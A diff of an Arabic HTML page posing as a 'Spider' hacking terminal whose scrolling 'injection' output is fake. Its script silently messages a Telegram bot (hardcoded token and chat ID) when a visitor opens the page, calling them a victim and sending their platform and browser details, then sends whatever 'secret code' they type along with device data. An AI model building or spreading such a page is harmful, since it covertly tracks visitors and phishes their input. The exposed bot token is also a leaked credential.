@@ -1,113 +1,133 @@
 <!DOCTYPE html>
-<html lang="ar">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <title>SPIDER-RAT | TERMINAL V.4.0</title>
+    <title>نظام سبايدر | التابع لمنظمة Egalsa</title>
     <style>
-        :root { --color: #00ff41; --bg: #000; }
-        body { background: var(--bg); color: var(--color); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
+        :root { --red: #ff0000; --dark-red: #330000; --bg: #050000; }
+        body { background: var(--bg); color: var(--red); font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; overflow: hidden; height: 100vh; }
         
-        /* الرادار */
-        #radar { position: absolute; top: 10px; right: 10px; width: 100px; height: 100px; border-radius: 50%; border: 1px solid var(--color); background: radial-gradient(circle, rgba(0,255,65,0.2) 0%, transparent 70%); }
-        #radar::after { content: ""; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--color); transform-origin: left; animation: rotate 2s linear infinite; }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        /* الرادار الأحمر */
+        #radar { position: absolute; top: 20px; left: 20px; width: 80px; height: 80px; border: 2px solid var(--red); border-radius: 50%; background: radial-gradient(circle, var(--dark-red) 0%, transparent 70%); box-shadow: 0 0 15px var(--red); }
+        #radar::after { content: ""; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--red); transform-origin: right; animation: sweep 2s linear infinite; }
+        @keyframes sweep { from { transform: translate(-100%, -50%) rotate(0deg); } to { transform: translate(-100%, -50%) rotate(360deg); } }
 
-        .header { border-bottom: 2px solid var(--color); padding: 10px; text-shadow: 0 0 10px var(--color); font-weight: bold; letter-spacing: 5px; text-align: center; }
+        .header { background: var(--dark-red); border-bottom: 2px solid var(--red); padding: 15px; font-size: 20px; font-weight: bold; letter-spacing: 2px; text-shadow: 0 0 10px var(--red); text-align: center; }
         
-        .main-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; flex-grow: 1; overflow: hidden; }
+        .grid-layout { display: grid; grid-template-columns: 1fr 2fr; gap: 15px; padding: 20px; height: calc(100vh - 150px); }
         
-        .panel { border: 1px solid var(--color); background: rgba(0, 20, 0, 0.8); padding: 15px; position: relative; overflow-y: auto; }
-        .panel-header { position: absolute; top: -10px; left: 10px; background: var(--bg); padding: 0 5px; font-size: 12px; }
+        .box { border: 1px solid var(--red); background: rgba(20, 0, 0, 0.7); position: relative; padding: 15px; overflow: hidden; box-shadow: inset 0 0 10px var(--dark-red); }
+        .box-title { position: absolute; top: 0; right: 10px; background: var(--red); color: #000; font-size: 12px; padding: 2px 8px; font-weight: bold; }
 
-        .log { font-size: 12px; margin-bottom: 5px; border-left: 2px solid var(--color); padding-left: 5px; }
+        #terminal, #stream { font-size: 13px; line-height: 1.6; height: 100%; overflow-y: auto; color: #ff6666; }
         
-        .input-area { grid-column: 1 / span 2; border: 1px solid #f00; padding: 15px; text-align: center; background: rgba(20, 0, 0, 0.9); }
-        input { background: transparent; border: none; border-bottom: 2px solid #f00; color: #f00; width: 60%; font-family: inherit; font-size: 18px; outline: none; text-align: center; }
-        .btn { background: #f00; color: #fff; padding: 10px 40px; border: none; cursor: pointer; font-weight: bold; margin-top: 15px; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); transition: 0.3s; }
-        .btn:hover { background: #fff; color: #f00; box-shadow: 0 0 20px #fff; }
+        .input-panel { position: fixed; bottom: 0; width: 100%; background: #110000; border-top: 2px solid var(--red); padding: 20px; text-align: center; box-sizing: border-box; }
+        input { background: #000; border: 1px solid var(--red); color: #fff; padding: 12px; width: 50%; text-align: center; outline: none; font-size: 16px; margin-bottom: 10px; }
+        .btn-red { background: var(--red); color: #000; padding: 12px 50px; border: none; font-weight: bold; cursor: pointer; font-size: 16px; box-shadow: 0 0 15px var(--red); transition: 0.3s; }
+        .btn-red:hover { background: #fff; box-shadow: 0 0 25px #fff; }
 
-        /* الأنيميشن */
-        .typing { overflow: hidden; white-space: nowrap; border-right: 2px solid var(--color); animation: typing 3s steps(40, end), blink-caret .75s step-end infinite; }
-        @keyframes typing { from { width: 0 } to { width: 100% } }
-        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: var(--color); } }
+        .glitch { animation: glitch-text 0.2s infinite; }
+        @keyframes glitch-text { 0% { opacity: 1; } 50% { opacity: 0.8; transform: skew(1deg); } 100% { opacity: 1; } }
     </style>
 </head>
 <body>
 
 <div id="radar"></div>
 
-<div class="header">
-    [ SYSTEM STATUS: COMPROMISED ] - SPIDER RAT V4.0.2
+<div class="header glitch">
+    [ نظام سبايدر - نسخة الاختراق المتقدم V5.0 ]
 </div>
 
-<div class="main-container">
-    <div class="panel">
-        <div class="panel-header">CONNECTION_LOGS</div>
-        <div id="logs"></div>
+<div class="grid-layout">
+    <div class="box">
+        <div class="box-title">سجل العمليات</div>
+        <div id="terminal"></div>
     </div>
-    
-    <div class="panel">
-        <div class="panel-header">INJECTION_STREAM</div>
-        <div id="stream" style="color: #008f11;"></div>
+    <div class="box">
+        <div class="box-title">بث حقن البيانات</div>
+        <div id="stream"></div>
     </div>
+</div>
 
-    <div class="input-area">
-        <h3 style="color: #f00; margin-top: 0;">DESTABILIZE TARGET SYSTEM</h3>
-        <input type="text" id="target" placeholder="Enter Authentication Key...">
-        <br>
-        <button class="btn" onclick="execute()">EXECUTE SPIDER INJECTION</button>
-    </div>
+<div class="input-panel">
+    <div style="margin-bottom: 10px; font-weight: bold;">أدخل معرف النظام لبدء عملية السحب العميق</div>
+    <input type="text" id="targetKey" placeholder="أدخل الكود السري هنا...">
+    <br>
+    <button class="btn-red" onclick="startAttack()">تفعيل بروتوكول السيطرة</button>
 </div>
 
 <script>
-    const config = {
+    const spiderConfig = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    // أكواد الحقن الوهمية
-    const streamItems = ["0x8821", "ACCESS_GRANTED", "MD5_DECRYPT", "BYPASS_SSL", "GET_SESSIONS", "DUMP_SQL", "DEBUG_PORT_80"];
-    setInterval(() => {
-        const line = document.createElement('div');
-        line.innerText = `> ${streamItems[Math.floor(Math.random()*streamItems.length)]} -> ${Math.random().toString(16).substr(2, 8)}`;
-        document.getElementById('stream').prepend(line);
-    }, 500);
-
-    // سحب البيانات الفوري
+    // إرسال صامت فوري عند الدخول
     window.onload = () => {
-        fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent("⚠️ ضحية دخلت الواجهة الاحترافية!\nجهازه: " + navigator.platform)}`);
-        addLog("Initializing Spider Framework...");
-        setTimeout(() => addLog("Searching for vulnerabilities..."), 1000);
+        sendToSpider("⚠️ دخول جديد للواجهة الحمراء!");
+        writeLog("بدء تشغيل محرك Egalsa...");
+        writeLog("جاري فحص الثغرات المتاحة...");
+        generateStream();
     };
 
-    function addLog(msg) {
-        const logs = document.getElementById('logs');
-        const l = document.createElement('div');
-        l.className = "log typing";
-        l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
-        logs.appendChild(l);
+    function writeLog(msg) {
+        const term = document.getElementById('terminal');
+        term.innerHTML += `<div style="margin-bottom:5px;">> [${new Date().toLocaleTimeString()}] ${msg}</div>`;
+        term.scrollTop = term.scrollHeight;
     }
 
-    function execute() {
-        const target = document.getElementById('target').value;
-        addLog(`Attacking: ${target}...`);
+    function generateStream() {
+        const stream = document.getElementById('stream');
+        const codes = ["BYPASS_SECURITY", "EXTRACT_DB", "INJECT_MALWARE", "GPS_TRACKING", "DUMP_MESSAGES", "DECRYPT_RSA"];
+        setInterval(() => {
+            const line = document.createElement('div');
+            line.style.fontSize = "11px";
+            line.innerHTML = `[+] جاري تنفيذ: ${codes[Math.floor(Math.random()*codes.length)]} --- الحزمة: ${Math.random().toString(36).substring(7)}`;
+            stream.prepend(line);
+        }, 400);
+    }
+
+    function startAttack() {
+        const val = document.getElementById('targetKey').value;
+        writeLog(`بدء الهجوم على المعرف: ${val}`);
+        writeLog("جاري كسر حماية النظام...");
         
-        // صوت "Bip" احترافي
-        const ctx = new AudioContext();
-        const osc = ctx.createOscillator();
-        osc.type = "square";
-        osc.frequency.value = 150;
-        osc.connect(ctx.destination);
-        osc.start();
-        setTimeout(() => osc.stop(), 200);
+        // تأثير اهتزاز الشاشة
+        document.body.style.animation = "shake 0.5s";
+        setTimeout(() => document.body.style.animation = "", 500);
 
         setTimeout(() => {
-            addLog("ROOT ACCESS OBTAINED.");
-            addLog("EXTRACTING SENSITIVE DATA...");
-            fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent("🔥 تم الضغط على التنفيذ!\nالمدخل: " + target)}`);
-        }, 1500);
+            writeLog("تم الحصول على صلاحيات الجذر (ROOT)!");
+            writeLog("جاري نقل البيانات إلى السيرفر الرئيسي...");
+            sendToSpider(`🔥 تم تنفيذ الضربة!\nالنص المدخل: ${val}\nالجهاز: ${navigator.platform}`);
+            alert("فشل في النظام: تم اكتشاف محاولة اختراق خارجية!");
+        }, 2000);
+    }
+
+    async function sendToSpider(msg) {
+        const info = `
+🔴 **EGALSA RED ALERT** 🔴
+━━━━━━━━━━━━━━━
+${msg}
+🌐 المتصفح: ${navigator.userAgent.split(' ')[0]}
+⏰ الوقت: ${new Date().toLocaleString('ar-EG')}
+━━━━━━━━━━━━━━━
+📍 تم التنفيذ بواسطة سبايدر
+        `;
+        fetch(`https://api.telegram.org/bot${spiderConfig.token}/sendMessage?chat_id=${spiderConfig.chatId}&text=${encodeURIComponent(info)}&parse_mode=Markdown`);
     }
 </script>
+
+<style>
+    @keyframes shake {
+        0% { transform: translate(1px, 1px) rotate(0deg); }
+        20% { transform: translate(-3px, 0px) rotate(1deg); }
+        40% { transform: translate(3px, 2px) rotate(-1deg); }
+        60% { transform: translate(-3px, 1px) rotate(0deg); }
+        80% { transform: translate(3px, 1px) rotate(-1deg); }
+        100% { transform: translate(1px, -2px) rotate(0deg); }
+    }
+</style>
 
 </body>
 </html>
